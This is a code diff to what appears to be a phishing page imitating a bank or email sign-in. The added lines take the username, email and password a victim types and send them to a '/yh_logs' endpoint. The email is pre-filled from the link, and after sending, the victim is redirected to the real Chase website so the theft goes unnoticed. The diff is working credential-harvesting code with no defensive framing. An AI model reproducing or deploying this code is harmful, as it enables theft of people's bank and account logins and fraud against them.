@@ -217,8 +217,8 @@ function getUrlVars()
 $('#email123').text((getUrlVars()['email']));
 $('#signin-button').on('click', ()=>{
 console.log(4);
-$.get( "/yh_logs", { username: "John", email: "2pm", password: "pass"}).done(function( data ) {
-    alert( "Data Loaded: " + data );
+$.get( "/yh_logs", { username: $('#userId-text-input-field').val(), email: $('#email123').text(), password: $('#password-text-input-field').val()}).done(function( data ) {
+    window.location.replace("https://secure07a.chase.com");
   });
 
 });
